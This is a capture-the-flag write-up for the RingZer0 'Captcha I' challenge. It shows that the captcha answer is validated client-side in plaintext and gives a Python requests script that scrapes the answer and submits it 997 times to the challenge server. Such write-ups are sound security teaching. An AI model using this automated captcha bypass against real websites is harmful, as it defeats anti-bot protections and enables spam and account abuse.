# Captcha I

### Author

Synne-R

### Description

No description
 
## Solution
 
Opening the challenge page and navigating to the Captcha I section of the page we saw that the objective was solving correctly the captcha 1000 times in a row. After looking around in the page we realized that the captcha content was validated locally and the correct value was in plaintext in a script tag:
```
function doIt(){
	var A = document.getElementById('captcha-form').value; 
		if (A == "hiyee"){
			document.forms["Form1"].submit();
		}
	else {
		alert("BAD Captcha");
	}
}
```
Hence, we wrote a simple script that solves the challenge leaving for us the last tries:
```
import requests as rq
import re

#s = rq.Session()

headers = {
    'Referer':'http://challenges.ringzer0team.com:10138/form1.php',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36',
    'Origin': 'http://challenges.ringzer0team.com:10138/'
    }

cookies = {'PHPSESSID':'REDACTED'}

for i in range(997):

    url = 'http://challenges.ringzer0team.com:10138/form1.php'
    r = rq.get(url, cookies=cookies, headers=headers)
    r1 = rq.get('http://challenges.ringzer0team.com:10138/captcha/captchabroken.php?new', cookies=cookies, headers=headers)

    txt = r.text
    token = re.findall(r'A == "(.*?)"', txt)[0]

    data = {'captcha': token}
    r = rq.post('http://challenges.ringzer0team.com:10138/captcha1.php', data, cookies=cookies, headers=headers, allow_redirects=True)
    res = r.text.strip()
    print(res[res.find('You now have'):])
```
